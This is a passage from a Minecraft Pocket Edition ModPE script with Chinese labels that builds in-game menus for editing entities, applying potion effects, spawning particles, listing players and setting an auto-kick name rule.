按钮(temp,"I",50,50,1,0).setOnClickListener(new pg.avVOCL({onClick:function(){
打字附加=ChatColor.BEGIN;
}}));

按钮(temp,"选择",80,50,1,0).setOnClickListener(new pg.avVOCL({onClick:function(){

try{
var a=[ChatColor.AQUA,ChatColor.BEGIN,ChatColor.BLACK,ChatColor.BLUE,ChatColor.BOLD,ChatColor.DARK_AQUA,ChatColor.DARK_BLUE,ChatColor.DARK_GRAY,ChatColor.DARK_GREEN,ChatColor.DARK_PURPLE,ChatColor.DARK_RED,ChatColor.GOLD,ChatColor.GRAY,ChatColor.GREEN,ChatColor.LIGHT_PURPLE,ChatColor.RED,ChatColor.RESET,ChatColor.WHITE,ChatColor.YELLOW,null];

var b=["天蓝","斜体","黑色","蓝色","加粗","暗天","暗蓝","暗灰","暗绿","暗紫","暗红","金色","灰色","绿色","亮紫","红色","重置","白色","黄色","空的"];

var n1=new pg.awLL(ctx);
n1.setOrientation(1);
n1.setGravity(17);
var ii=0,i=0
while(ii<4){
var n2=new pg.awLL(ctx);
外观(n2,-2,-2);
var iu=0
while(iu<5){iu++
eval("按钮(n2,b[i],80,50,5,0).setOnClickListener(new pg.avVOCL({onClick:function(){打字附加=a["+(i)+"]}}))")
i++
}
n1.addView(n2);
ii++
}
var n=新建窗口(参数(450),参数(300),n1,true);
n.showAtLocation(ctx.getWindow().getDecorView(),0,winx,winy);
}catch(e){print(e)}
}}));

$4.addView(temp)

勾选($4,"开启防爆",aswi[9]).setOnCheckedChangeListener(new pg.awCBOCCL({
onCheckedChanged:function(){try{
aswi[9]=!aswi[9]
}catch(e){print(e)}
}}));
勾选($4,"开启防熊",aswi[16]).setOnCheckedChangeListener(new pg.awCBOCCL({
onCheckedChanged:function(){try{
aswi[16]=!aswi[16]
}catch(e){print(e)}
}}));

勾选($4,"禁止更新",false).setOnCheckedChangeListener(new pg.awCBOCCL({
onCheckedChanged:function(){try{
}catch(e){print(e)}
}}));
勾选($4,"显示地图",false).setOnCheckedChangeListener(new pg.awCBOCCL({
onCheckedChanged:function(){try{
}catch(e){print(e)}
}}));
勾选($4,"生物显血",false).setOnCheckedChangeListener(new pg.awCBOCCL({
onCheckedChanged:function(){try{
}catch(e){print(e)}
}}));

}

if(标题a==astr[157]){
var 实体ID标题=文本($4,"实体基本信息:\n实体id:"+实体id设置+"\n实体模型:"+实体模型设置+"\n实体血量:"+实体血量+"\n实体名字:"+实体名字+"\n实体年龄:"+实体年龄)

分割线($4)

按钮($4,"刷新信息",-1).setOnClickListener(new pg.avVOCL({
onClick:
function(v){
获得实体信息();
实体ID标题.setText("实体基本信息:\n实体id:"+实体id设置+"\n实体模型:"+实体模型设置+"\n实体血量:"+实体血量+"\n实体名字:"+实体名字+"\n实体年龄:"+实体年龄)
}}))

按钮($4,"选取玩家",-1).setOnClickListener(new pg.avVOCL({
onClick:
function(v){
控制实体=getPlayerEnt();
获得实体信息();
实体ID标题.setText("实体基本信息:\n实体id:"+实体id设置+"\n实体模型:"+实体模型设置+"\n实体血量:"+实体血量+"\n实体名字:"+实体名字+"\n实体年龄:"+实体年龄)
}}))
按钮($4,"给选取工具",-1).setOnClickListener(new pg.avVOCL({
onClick:
function(v){
cM("在背包查收")
addItemInventory(物品id组[9],1,0)
}}))

分割线($4)

var 实体年龄标题=文本($4,"实体年龄:"+实体年龄)

var seekbar0=拖动($4,实体年龄,24000)
seekbar0.setOnSeekBarChangeListener(new pg.awSBOSBCL({
onProgressChanged:
function(v){
实体年龄=seekbar0.getProgress();
实体年龄标题.setText("实体年龄:"+实体年龄);
}}))

按钮($4,"设置实体年龄",-1).setOnClickListener(new pg.avVOCL({
onClick:
function(v){
try{Entity.setAnimalAge(控制实体,实体年龄);cM(astr[0]);}catch(e){cM(astr[1]);}
}}))

分割线($4)

var 披风值=0

按钮($4,"设置实体披风",-1).setOnClickListener(new pg.avVOCL({
onClick:
function(v){
try{
Entity.setCape(控制实体,"mob/cape"+披风值+".png");

if(披风值==10){披风值=0;}cM(astr[0]+披风值);披风值++;
}catch(e){cM(astr[1]);披风值=0}
}}))

var 皮肤值=0

按钮($4,"设置实体皮肤",-1).setOnClickListener(new pg.avVOCL({
onClick:
function(v){
try{
Entity.setMobSkin(控制实体,"mob/skin"+皮肤值+".png");

if(皮肤值==10){皮肤值=0;}cM(astr[0]+皮肤值);皮肤值++;
}catch(e){cM(astr[1]+e);}
}}))

分割线($4)

var eid=Player.getCarriedItem(),eco=Player.getCarriedItemCount(),edm=Player.getCarriedItemData()

var 实体物品标题=文本($4,"实体物品:"+eid+","+eco+","+edm)

var idint=输入($4,eid,"物品id",null,null,null,true)

var seekbar2=拖动($4,eco,255)
seekbar2.setOnSeekBarChangeListener(new pg.awSBOSBCL({
onProgressChanged:
function(v){
eco=seekbar2.getProgress();
实体物品标题.setText("实体物品:"+idint.getText()+","+eco+","+edm);
}}))

var seekbar3=拖动($4,edm,200)
seekbar3.setOnSeekBarChangeListener(new pg.awSBOSBCL({
onProgressChanged:
function(v){
edm=seekbar3.getProgress();
实体物品标题.setText("实体物品:"+idint.getText()+","+eco+","+edm);
}}))

按钮($4,"设置实体物品",-1).setOnClickListener(new pg.avVOCL({
onClick:
function(v){
try{Entity.setCarriedItem(控制实体,idint.getText(),eco,edm);cM(astr[0]);}catch(e){cM(astr[1]);}
}}))

分割线($4)

var armid=Player.getCarriedItem(),armdm=Player.getCarriedItemData()

var 实体盔甲标题=文本($4,"实体盔甲:"+armid+","+armdm)

var arid=输入($4,armid,"盔甲id",null,null,null,true)

var armdg=拖动($4,armdm,1000)
armdg.setOnSeekBarChangeListener(new pg.awSBOSBCL({
onProgressChanged:
function(v){
armdm=armdg.getProgress();
armid=arid.getText()
实体盔甲标题.setText("实体盔甲:"+armid+","+armdm);
}}))

var c$4=new pg.awLL(ctx)

按钮(c$4,"头盔",140,-2,5,0).setOnClickListener(new pg.avVOCL({onClick:function(viewarg){try{Entity.setArmor(控制实体,0,arid.getText(),armdm);cM(astr[0]);}catch(e){cM(astr[1]);}
}}))

按钮(c$4,"胸甲",140,-2,5,0).setOnClickListener(new pg.avVOCL({onClick:function(viewarg){try{Entity.setArmor(控制实体,1,arid.getText(),armdm);cM(astr[0]);}catch(e){cM(astr[1]);}
}}))
$4.addView(c$4)

var c$4=new pg.awLL(ctx)

按钮(c$4,"护腿",140,-2,5,0).setOnClickListener(new pg.avVOCL({onClick:function(viewarg){try{Entity.setArmor(控制实体,2,arid.getText(),armdm);cM(astr[0]);}catch(e){cM(astr[1]);}

}}))
按钮(c$4,"靴子",140,-2,5,0).setOnClickListener(new pg.avVOCL({onClick:function(viewarg){  
try{Entity.setArmor(控制实体,3,arid.getText(),armdm);cM(astr[0]);}catch(e){cM(astr[1]);}

}}))
$4.addView(c$4)
分割线($4)
var 实体速度标题=文本($4,"实体速度:"+x速度+","+y速度+","+z速度)

var x调整速度=拖动($4,实体x速+128,256)
x调整速度.setOnSeekBarChangeListener(new pg.awSBOSBCL({
onProgressChanged:
function(v){
x速度=x调整速度.getProgress()-128;
实体速度标题.setText("实体速度:"+x速度+","+y速度+","+z速度);
}}))

var y调整速度=拖动($4,实体y速+128,256)
y调整速度.setOnSeekBarChangeListener(new pg.awSBOSBCL({
onProgressChanged:
function(v){
y速度=y调整速度.getProgress()-128;
实体速度标题.setText("实体速度:"+x速度+","+y速度+","+z速度);
}}))

var z调整速度=拖动($4,实体z速+128,256)
z调整速度.setOnSeekBarChangeListener(new pg.awSBOSBCL({
onProgressChanged:
function(v){
z速度=z调整速度.getProgress()-128;
实体速度标题.setText("实体速度:"+x速度+","+y速度+","+z速度);
}}))

按钮($4,"重置速度",-1).setOnClickListener(new pg.avVOCL({
onClick:
function(v){
x速度=0,y速度=0,z速度=0;
实体速度标题.setText("实体速度:"+x速度+","+y速度+","+z速度);
x调整速度.setProgress(128)
y调整速度.setProgress(128)
z调整速度.setProgress(128)
}}))

分割线($4)
var x视角=0,y视角=0

var 实体视角标题=文本($4,"实体视角:"+x视角+","+y视角)

var x调整视角=拖动($4,x视角+90,180)
x调整视角.setOnSeekBarChangeListener(new pg.awSBOSBCL({
onProgressChanged:
function(v){
x视角=x调整视角.getProgress()-90;
实体视角标题.setText("实体视角:"+x视角+","+y视角);
setRot(控制实体,y视角,x视角);
}}))

var y调整视角=拖动($4,y视角,360)
y调整视角.setOnSeekBarChangeListener(new pg.awSBOSBCL({
onProgressChanged:
function(v){
y视角=y调整视角.getProgress();
实体视角标题.setText("实体视角:"+x视角+","+y视角);
setRot(控制实体,y视角,x视角);
}}))

分割线($4)

var 高度体积=0,半径体积=0

var 实体碰撞箱标题=文本($4,"实体碰撞箱:"+高度体积+","+半径体积)

var 半径调整=拖动($4,高度体积,100)
半径调整.setOnSeekBarChangeListener(new pg.awSBOSBCL({
onProgressChanged:
function(v){
高度体积=半径调整.getProgress()/10;
/////
实体碰撞箱标题.setText("实体碰撞箱:"+高度体积+","+半径体积);
}}))

var 高调整=拖动($4,0,100)
高调整.setOnSeekBarChangeListener(new pg.awSBOSBCL({
onProgressChanged:
function(v){
半径体积=高调整.getProgress()/10;
////
实体碰撞箱标题.setText("实体碰撞箱:"+高度体积+","+半径体积);
}}))

按钮($4,"设置实体碰撞箱",-1).setOnClickListener(new pg.avVOCL({
onClick:
function(v){
try{
Entity.setCollisionSize(控制实体,半径体积,高度体积);cM(astr[0]);}catch(e){cM(astr[1]);}
}}))

分割线($4)
var timef=0

var 实体着火标题=文本($4,"实体着火时间:"+timef)

var seekbarfire=拖动($4,timef,1000)
seekbarfire.setOnSeekBarChangeListener(new pg.awSBOSBCL({
onProgressChanged:
function(v){
timef=seekbarfire.getProgress();
实体着火标题.setText("实体着火时间:"+timef);
}}))

按钮($4,"设置实体着火",-1).setOnClickListener(new pg.avVOCL({
onClick:
function(v){
try{Entity.setFireTicks(控制实体,timef);cM(astr[0]);}catch(e){cM(astr[1]);}
}}))

分割线($4)
var 实体模型标题=文本($4,"实体模型:"+实体模型选取)

按钮($4,"实体模型表",-1).setOnClickListener(new pg.avVOCL({
onClick:
function(v){
var a=[EntityRenderType.arrow,EntityRenderType.bat,EntityRenderType.blaze,EntityRenderType.boat,EntityRenderType.camera,EntityRenderType.chicken,EntityRenderType.cow,EntityRenderType.creeper,EntityRenderType.egg,EntityRenderType.enderman,EntityRenderType.expPotion,EntityRenderType.experienceOrb,EntityRenderType.fallingTile,EntityRenderType.fireball,EntityRenderType.fishHook,EntityRenderType.ghast,EntityRenderType.human,EntityRenderType.ironGolem,EntityRenderType.item,EntityRenderType.lavaSlime,EntityRenderType.lightningBolt,EntityRenderType.map,EntityRenderType.minecart,EntityRenderType.mushroomCow,EntityRenderType.ocelot,EntityRenderType.painting,EntityRenderType.pig,EntityRenderType.player,EntityRenderType.rabbit,EntityRenderType.sheep,EntityRenderType.silverfish,EntityRenderType.skeleton,EntityRenderType.slime,EntityRenderType.smallFireball,EntityRenderType.snowGolem,EntityRenderType.snowball,EntityRenderType.spider,EntityRenderType.squid,EntityRenderType.thrownPotion,EntityRenderType.tnt,EntityRenderType.unknownItem,EntityRenderType.villager,EntityRenderType.villagerZombie,EntityRenderType.witch,EntityRenderType.wolf,EntityRenderType.zombie,EntityRenderType.zombiePigman];

var b=["箭","蝙蝠","烈焰人","船","照相机","鸡","牛","爬行者","鸡蛋","末影人","附魔之瓶","经验球","掉落的方块","火球","鱼钩","恶魂","人类","铁傀儡","掉落物品","岩浆怪","闪电","地图","矿车","哞菇","豹猫","画","猪","玩家","兔子","羊","蠹虫","骷髅","史莱姆","小火球","雪傀儡","雪球","蜘蛛","鱿鱼","喷溅型药水","TNT","未知物品","村民","村民僵尸","女巫","狼","僵尸","僵尸猪人"];
var layout=制作菜单(scrwid/2)

for(var i=0;i<a.length;i++){
eval("按钮(layout,b[i],-1).setOnClickListener(new pg.avVOCL({onClick:function(viewarg){实体模型标题.setText(\"实体模型:\"+b["+i+"]);实体模型选取=a["+i+"];}}));")
}
}}))

按钮($4,"设置实体模型",-1).setOnClickListener(new pg.avVOCL({
onClick:
function(v){
try{Entity.setRenderType(控制实体,实体模型选取);cM(astr[0]);}catch(e){cM(astr[1]);}
}}))

var 实体id标题=文本($4,"实体ID:"+实体id选取)

按钮($4,"实体ID表",-1).setOnClickListener(new pg.avVOCL({
onClick:
function(v){
var a=[EntityType.ARROW,EntityType.BAT,EntityType.BLAZE,EntityType.BOAT,EntityType.CAVE_SPIDER,EntityType.CHICKEN,EntityType.COW,EntityType.CREEPER,EntityType.EGG,EntityType.ENDERMAN,EntityType.EXPERIENCE_ORB,EntityType.EXPERIENCE_POTION,EntityType.FALLING_BLOCK,EntityType.FIREBALL,EntityType.FISHING_HOOK,EntityType.GHAST,EntityType.IRON_GOLEM,EntityType.ITEM,EntityType.LAVA_SLIME,EntityType.LIGHTNING_BOLT,EntityType.MINECART,EntityType.MUSHROOM_COW,EntityType.OCELOT,EntityType.PAINTING,EntityType.PIG,EntityType.PIG_ZOMBIE,EntityType.PLAYER,EntityType.PRIMED_TNT,EntityType.RABBIT,EntityType.SHEEP,EntityType.SILVERFISH,EntityType.SKELETON,EntityType.SLIME,EntityType.SMALL_FIREBALL,EntityType.SNOWBALL,EntityType.SNOW_GOLEM,EntityType.SPIDER,EntityType.SQUID,EntityType.THROWN_POTION,EntityType.VILLAGER,EntityType.WOLF,EntityType.ZOMBIE,EntityType.ZOMBIE_VILLAGER];

var b=["箭","蝙蝠","烈焰人","船","洞穴蜘蛛","鸡","牛","爬行者","鸡蛋","末影人","经验球","附魔之瓶","掉落方块","火球","鱼钩","恶魂","铁傀儡","掉落物品","岩浆怪","闪电","矿车","哞菇","豹猫","画","猪","僵尸猪人","玩家","点燃的TNT","兔子","羊","蠹虫","骷髅","史莱姆","小火球","雪球","雪傀儡","蜘蛛","鱿鱼","喷溅型药水","村民","狼","僵尸","村民僵尸"];
var layout=制作菜单(scrwid/2)
for(var i=0;i<a.length;i++){
eval("按钮(layout,b[i],-1).setOnClickListener(new pg.avVOCL({onClick:function(viewarg){实体id标题.setText(\"实体ID:\"+b["+i+"]);实体id选取=a["+i+"];}}));")
}
}}))

分割线($4)

var 实体名称标题=文本($4,"实体名称设置");

var names=Entity.getNameTag(控制实体);

if(names==null){names="";}

var namestr=输入($4,names,"实体名称",null,null,null,true)

按钮($4,"设置实体名称",-1).setOnClickListener(new pg.avVOCL({
onClick:
function(v){
try{Entity.setNameTag(控制实体,namestr.getText());cM(astr[0]);}catch(e){cM(astr[1]);}
}}))

分割线($4)

var hea=Entity.getHealth(控制实体);

var 实体血量标题=文本($4,"实体血量:"+hea)

var sear4=拖动($4,hea,500)
sear4.setOnSeekBarChangeListener(new pg.awSBOSBCL({
onProgressChanged:
function(v){
hea=sear4.getProgress();
实体血量标题.setText("实体血量:"+hea);
}}))

按钮($4,"设置实体血量",-1).setOnClickListener(new pg.avVOCL({
onClick:
function(v){
try{Entity.setHealth(控制实体,hea);cM(astr[0]);}catch(e){cM(astr[1]);}
}}))

分割线($4)

var 实体tp=文本($4,"实体通用坐标:");

var 实体x=Math.round(Entity.getX(控制实体))
var 实体y=Math.round(Entity.getY(控制实体))
var 实体z=Math.round(Entity.getZ(控制实体))

if(实体x==0&&实体y==0&&实体z==0){
var 实体x=Math.round(Player.getX())
var 实体y=Math.round(Player.getY())
var 实体z=Math.round(Player.getZ())
}

按钮($4,"获取玩家坐标",-1).setOnClickListener(new pg.avVOCL({
onClick:
function(v){
实体x=Math.round(Player.getX());
实体y=Math.round(Player.getY());
实体z=Math.round(Player.getZ());
xint.setText(""+实体x+"");
yint.setText(""+实体y+"");
zint.setText(""+实体z+"");
}}))

var xint=输入($4,实体x,"x坐标",null,null,null,true)

var yint=输入($4,实体y,"y坐标",null,null,null,true)

var zint=输入($4,实体z,"z坐标",null,null,null,true)

按钮($4,"传送实体",-1).setOnClickListener(new pg.avVOCL({
onClick:
function(v){
try{Entity.setPosition(控制实体,xint.getText(),yint.getText(),zint.getText());cM(astr[0]);}catch(e){cM(astr[1]);}
}}))

分割线($4)
按钮($4,astr[158],-1).setOnClickListener(new pg.avVOCL({onClick:function(viewarg){打开窗口(astr[158],0,5,0,0,0,0)
}}))
按钮($4,"转换到实体视角",-1).setOnClickListener(new pg.avVOCL({onClick:function(viewarg){ModPE.setCamera(控制实体)
}}))
按钮($4,"骑该实体",-1).setOnClickListener(new pg.avVOCL({onClick:function(viewarg){rideAnimal(getPlayerEnt(),控制实体)
}}))
按钮($4,"该实体骑自己",-1).setOnClickListener(new pg.avVOCL({onClick:function(viewarg){rideAnimal(控制实体,getPlayerEnt())
}}))

按钮($4,"生成实体",-1).setOnClickListener(new pg.avVOCL({
onClick:
function(v){
try{
var mobsp=Level.spawnMob(实体x,实体y,实体z,实体id选取);
Entity.setRenderType(mobsp,实体模型选取);
Entity.setNameTag(mobsp,namestr.getText());
Entity.setHealth(mobsp,hea);cM(astr[0]);}catch(e){cM(astr[1]+e);}
}}))
按钮($4,"移除实体",-1).setOnClickListener(new pg.avVOCL({
onClick:
function(v){
if(控制实体==getPlayerEnt()){print("你想试试卡死的滋味吗？");return;}
try{Entity.remove(控制实体);cM(astr[0]);}catch(e){cM(e);}
}}))
按钮($4,"移除所有实体",-1).setOnClickListener(new pg.avVOCL({
onClick:
function(v){
清除所有实体()
}}))

}

if(标题a==astr[158]){
var title1=文本($4,"强度:"+效果强度)
 
var seekbar=拖动($4,效果强度,255)
seekbar.setOnSeekBarChangeListener(new pg.awSBOSBCL({
onProgressChanged:
function(v){
效果强度=seekbar.getProgress();
title1.setText("强度:"+效果强度);
}}))

var title2=文本($4,"时间:"+效果时间)

var seekbar1=拖动($4,效果时间,60)
seekbar1.setOnSeekBarChangeListener(new pg.awSBOSBCL({
onProgressChanged:
function(v){
效果时间=seekbar1.getProgress();
title2.setText("时间:"+效果时间);
}}))

按钮($4,"清除所有效果",-1).setOnClickListener(new pg.avVOCL({onClick:function(viewarg){ 
try{Entity.removeAllEffects(控制实体);cM("已移除 "+Player.getName(控制实体)+" 的所有药水效果");}
catch(e){cM("不是一个玩家");}
}}))
 
按钮($4,"清除攻击效果",-1).setOnClickListener(new pg.avVOCL({
onClick:function(viewarg){效果组=[]
print(astr[0])
}}))

勾选($4,"药水效果用于攻击",aswi[5]).setOnCheckedChangeListener(new pg.awCBOCCL({
onCheckedChanged:function(){try{
aswi[5]=!aswi[5]
}catch(e){print(e)}
}}));
分割线($4)
文本($4,"如果没有选择实体，请打开玩家列表选择自己")
按钮($4,"选取玩家",-1).setOnClickListener(new pg.avVOCL({onClick:function(viewarg){打开窗口(astr[159],astr[159],3,0,0,0,0);
}}))
 分割线($4)
var a=[MobEffect.absorption,MobEffect.blindness,MobEffect.confusion,MobEffect.damageBoost,MobEffect.damageResistance,MobEffect.digSlowdown,MobEffect.digSpeed,MobEffect.fireResistance,MobEffect.harm,MobEffect.heal,MobEffect.healthBoost,MobEffect.hunger,MobEffect.invisibility,MobEffect.jump,MobEffect.movementSlowdown,MobEffect.movementSpeed,MobEffect.nightVision,MobEffect.poison,MobEffect.regeneration,MobEffect.saturation,MobEffect.waterBreathing,MobEffect.weakness,MobEffect.wither];

var b=["伤害吸收","失明","反胃","力量","抗性提升","挖掘疲劳","急迫","防火","瞬间伤害","瞬间治疗","生命提升","饥饿","隐身","跳跃提升","缓慢","速度","夜视","中毒","生命恢复","饱和","水下呼吸","虚弱","凋零"];
for(i=0;i<a.length;i++){
eval("var f$"+i+"=按钮($4,b[i],-1);f$"+i+".setOnClickListener(new pg.avVOCL({onClick:function(viewarg){try{效果组.push(a["+i+"]);Entity.addEffect(控制实体,a["+i+"],1200*效果时间,效果强度,false,true);cM(\"给予 \"+Player.getName(控制实体)+\" 时长为 \"+效果时间+\"分钟的 \"+b["+i+"]+\" 强度为\"+效果强度+\" 效果\");}catch(e){print(\"未选择实体\"+e);}}}));f$"+i+".setOnLongClickListener(new pg.avVOLCL({onLongClick:function(viewarg){try{Entity.removeEffect(控制实体,a["+i+"]);cM(\"移除 \"+Player.getName(控制实体)+\" 的 \"+b["+i+"]+\" 效果\");}catch(e){print(\"未选择实体\"+e);}return true;}}));");
}}

if(标题a==astr[159]){
玩家数组=Server.getAllPlayers();
按钮($4,"点我刷新列表",-1).setOnClickListener(new pg.avVOCL({
onClick:
function(v){
win.dismiss();win=null;
打开窗口(标题a,组件,窗号,300,400,winx,winy);

print(astr[0]);
}}))

for(var i=0;i<玩家固定数;i++){
try{eval("按钮($4,\"玩家"+i+"(\"+Entity.getNameTag(玩家数组["+i+"])+\")\",-1).setOnClickListener(new pg.avVOCL({\nonClick:\nfunction(v){\nif(玩家数组["+i+"]!=null){openPlayerControlMenu("+i+");控制玩家=玩家数组["+i+"];控制实体=玩家数组["+i+"];获得实体信息();cM(\"已选定该玩家\");}\nelse{cM(\"找不到该玩家\");}\n}}))")
}catch(e){}
}
var f$11=按钮($4,"获取("+Entity.getNameTag(获取玩家)+")",-1)
f$11.setOnClickListener(new pg.avVOCL({
onClick:function(v){
if(获取玩家!=null){
openPlayerControlMenu(玩家固定数);
控制玩家=获取玩家;
控制实体=获取玩家;
获得实体信息();
cM("已选定该玩家");}
else{cM("找不到该玩家");}
}}))

var 名字a=输入($4,"","输入名字以获取",null,null,null,true)

按钮($4,"获取玩家",-1).setOnClickListener(new pg.avVOCL({
onClick:function(v){
try{
var name=pg.jlS(名字a.getText())
玩家名称获取(name);
获取玩家=玩家名称获取(name);
f$11.setText("获取("+Entity.getNameTag(获取玩家)+")")
print("已获取玩家"+Entity.getNameTag(玩家名称获取(name)));
}catch(e){alert(astr[2]+":\n"+e);}
}}))

var title=文本($4,"自动踢人包括的名字")

var 踢人=输入($4,踢人名称,"踢人包括名称使用正则表达式",null,null,null,true)

按钮($4,"保存规则",-1).setOnClickListener(new pg.avVOCL({
onClick:function(v){
try{
踢人名称=踢人.getText()
写入主数据();
print(astr[0])
}catch(e){alert(astr[2]+":\n"+e);}
}}))

按钮($4,"正则表达式帮助",-1).setOnClickListener(new pg.avVOCL({
onClick:function(v){
alert("正则表达式基本语法\n两个特殊的符号`^`和`$`。他们的作用是分别指出一个字符串的开始和结束。例子如下：\n“^The“：表示所有以“The“开始的字符串（“There“，“The cat“等）；\n“of despair$“：表示所以以“of despair“结尾的字符串；\n“^abc$“：表示开始和结尾都是“abc“的字符串——呵呵，只有“abc“自己了；\n“notice“：表示任何包含“notice“的字符串。\n象最后那个例子，如果你不使用两个特殊字符，你就在表示要查找的串在被查找串的任意部分——你并\n不把它定位在某一个顶端。\n其它还有`*`，`+`和`?`这三个符号，表示一个或一序列字符重复出现的次数。它们分别表示“没有或\n更多”，“一次或更多”还有“没有或一次”。下面是几个例子：\n“ab*“：表示一个字符串有一个a后面跟着零个或若干个b。（“a“, “ab“, “abbb“,……）；\n“ab+“：表示一个字符串有一个a后面跟着至少一个b或者更多；\n“ab?“：表示一个字符串有一个a后面跟着零个或者一个b；\n“a?b+$“：表示在字符串的末尾有零个或一个a跟着一个或几个b。\n你也可以使用范围，用大括号括起，用以表示重复次数的范围。\n“ab{2}“：表示一个字符串有一个a跟着2个b（“abb“）；\n“ab{2,}“：表示一个字符串有一个a跟着至少2个b；\n“ab{3,5}“：表示一个字符串有一个a跟着3到5个b。\n请注意，你必须指定范围的下限（如：“{0,2}“而不是“{,2}“）。还有，你可能注意到了，`*`，`+`和\n`?`相当于“{0,}“，“{1,}“和“{0,1}“。\n还有一个`¦`，表示“或”操作：\n“hi¦hello“：表示一个字符串里有“hi“或者“hello“；\n“(b¦cd)ef“：表示“bef“或“cdef“；\n“(a¦b)*c“：表示一串“a““b“混合的字符串后面跟一个“c“；\n`.`可以替代任何字符：\n“a.[0-9]“：表示一个字符串有一个“a“后面跟着一个任意字符和一个数字；\n“^.{3}$“：表示有任意三个字符的字符串（长度为3个字符）；\n方括号表示某些字符允许在一个字符串中的某一特定位置出现：\n“[ab]“：表示一个字符串有一个“a“或“b“（相当于“a¦b“）；\n“[a-d]“：表示一个字符串包含小写的`a`到`d`中的一个（相当于“a¦b¦c¦d“或者“[abcd]“）；\n“^[a-zA-Z]“：表示一个以字母开头的字符串；\n“[0-9]%“：表示一个百分号前有一位的数字；\n“,[a-zA-Z0-9]$“：表示一个字符串以一个逗号后面跟着一个字母或数字结束。\n你也可以在方括号里用`^`表示不希望出现的字符，`^`应在方括号里的第一位。（如：“%[^a-zA-Z]%“表\n示两个百分号中不应该出现字母）。\n为了逐字表达，你必须在“^.$()¦*+?{\“这些字符前加上转移字符`\`。\n请注意在方括号中，不需要转义字符。")
}}))
}

if(标题a==astr[160]){
var xVel=0,yVel=0,zVel=0
var 粒子x=Math.round(Entity.getX(控制实体))
var 粒子y=Math.round(Entity.getY(控制实体))
var 粒子z=Math.round(Entity.getZ(控制实体))

var title显示=文本($4,"粒子类型:"+粒子种类名称)
 
var title2显示=文本($4,"粒子大小:"+大小)

var seekbar=拖动($4,0,255)
seekbar.setOnSeekBarChangeListener(new pg.awSBOSBCL({onProgressChanged:
function(v){
大小=seekbar.getProgress()*10;
title2显示.setText("粒子大小:"+大小)}}))

按钮($4,"粒子种类表",-1).setOnClickListener(new pg.avVOCL({
onClick:
function(v){
var a=[ParticleType.angryVillager,ParticleType.bubble,ParticleType.cloud,ParticleType.crit,ParticleType.dripLava,ParticleType.dripWater,ParticleType.enchantmenttable,ParticleType.fallingDust,ParticleType.flame,ParticleType.happyVillager,ParticleType.heart,ParticleType.hugeexplosion,ParticleType.hugeexplosionSeed,ParticleType.ink,ParticleType.itemBreak,ParticleType.largeexplode,ParticleType.lava,ParticleType.mobFlame,ParticleType.note,ParticleType.portal,ParticleType.rainSplash,ParticleType.redstone,ParticleType.slime,ParticleType.smoke,ParticleType.smoke2,ParticleType.snowballpoof,ParticleType.spell,ParticleType.spell2,ParticleType.spell3,ParticleType.splash,ParticleType.suspendedTown,ParticleType.terrain,ParticleType.waterWake];

var b=["愤怒的村民","泡泡","云","暴击","滴落岩浆","滴落水","附魔台文字","掉落的灰尘","火焰","高兴的村民","爱心","巨大爆炸","巨大爆炸种子","墨水","物品破碎","大爆炸","岩浆","生物火焰","音符","传送门","飞溅的雨","红石","史莱姆","烟雾","烟雾2","雪球破碎","螺纹","螺纹2","螺纹3","飞溅","悬浮","方块破坏","水球"];
var layout=制作菜单(scrwid/2)
文本(layout,"粒子种类表",5);
for(var i=0;i<a.length;i++){
eval("按钮(layout,b[i],-1).setOnClickListener(new pg.avVOCL({onClick:function(v){粒子种类=a["+i+"];粒子种类名称=b["+i+"];title显示.setText(\"粒子类型:\"+粒子种类名称);}}));")}
}}))


var 粒子速度标题=文本($4,"粒子速度:"+xVel+","+yVel+","+zVel)

var x粒子速度=拖动($4,xVel+128,256)
x粒子速度.setOnSeekBarChangeListener(new pg.awSBOSBCL({
onProgressChanged:
function(v){
xVel=x粒子速度.getProgress()-128;
粒子速度标题.setText("粒子速度:"+xVel+","+yVel+","+zVel);
}}))

var y粒子速度=拖动($4,yVel+128,256)
y粒子速度.setOnSeekBarChangeListener(new pg.awSBOSBCL({
onProgressChanged:
function(v){
yVel=y粒子速度.getProgress()-128;
粒子速度标题.setText("粒子速度:"+xVel+","+yVel+","+zVel);
}}))

var z粒子速度=拖动($4,zVel+128,256)
z粒子速度.setOnSeekBarChangeListener(new pg.awSBOSBCL({
onProgressChanged:
function(v){
zVel=z粒子速度.getProgress()-128;
粒子速度标题.setText("粒子速度:"+xVel+","+yVel+","+zVel);
}}))

按钮($4,"重置速度",-1).setOnClickListener(new pg.avVOCL({
onClick:
function(v){
xVel=0,yVel=0,zVel=0;
粒子速度标题.setText("粒子速度:"+xVel+","+yVel+","+zVel);
x粒子速度.setProgress(128)
y粒子速度.setProgress(128)
z粒子速度.setProgress(128)
}}))

按钮($4,"获取玩家坐标",-1).setOnClickListener(new pg.avVOCL({
onClick:
function(v){
粒子x=Math.round(Player.getX());
粒子y=Math.round(Player.getY());
粒子z=Math.round(Player.getZ());
xint.setText(""+粒子x+"");
yint.setText(""+粒子y+"");
zint.setText(""+粒子z+"");
}}))

var xint=输入($4,粒子x,"x坐标",null,null,null,true)
var yint=输入($4,粒子y,"y坐标",null,null,null,true)
var zint=输入($4,粒子z,"z坐标",null,null,null,true)

按钮($4,"添加粒子",-1).setOnClickListener(new pg.avVOCL({onClick:function(viewarg){try{Level.addParticle(粒子种类,粒子x,粒子y,粒子z,xVel/20,yVel/20,zVel/20,大小);cM(astr[0]);}catch(e){cM(astr[1]);}
}}))

}

if(标题a==astr[161]){
勾选($4,"开火按钮",开关gui(开火按钮)).setOnCheckedChangeListener(new pg.awCBOCCL({
onCheckedChanged:function(){try{
if(开火按钮==null){打开开火按钮();}
else{开火按钮.dismiss();开火按钮=null;}
}catch(e){print(e)}
}}));
勾选($4,"开启装逼",aswi[14]).setOnCheckedChangeListener(new pg.awCBOCCL({
onCheckedChanged:function(){try{
aswi[14]=!aswi[14]
}catch(e){print(e)}
}}));
勾选($4,"箱子全满",aswi[20]).setOnCheckedChangeListener(new pg.awCBOCCL({
onCheckedChanged:function(){try{
aswi[20]=!aswi[20]
}catch(e){print(e)}
}}));

勾选($4,"附魔按钮",开关gui(附魔按钮)).setOnCheckedChangeListener(new pg.awCBOCCL({
onCheckedChanged:function(){try{
if(附魔按钮==null){打开附魔按钮();}
else{附魔按钮.dismiss();附魔按钮=null;}
}catch(e){print(e)}
}}));

勾选($4,"更换ID",aswi[4]).setOnCheckedChangeListener(new pg.awCBOCCL({
onCheckedChanged:function(){try{
aswi[4]=!aswi[4]
}catch(e){print(e)}
}}));

勾选($4,"扔物辅助",开关gui(扔东西按钮)).setOnCheckedChangeListener(new pg.awCBOCCL({
onCheckedChanged:function(){try{
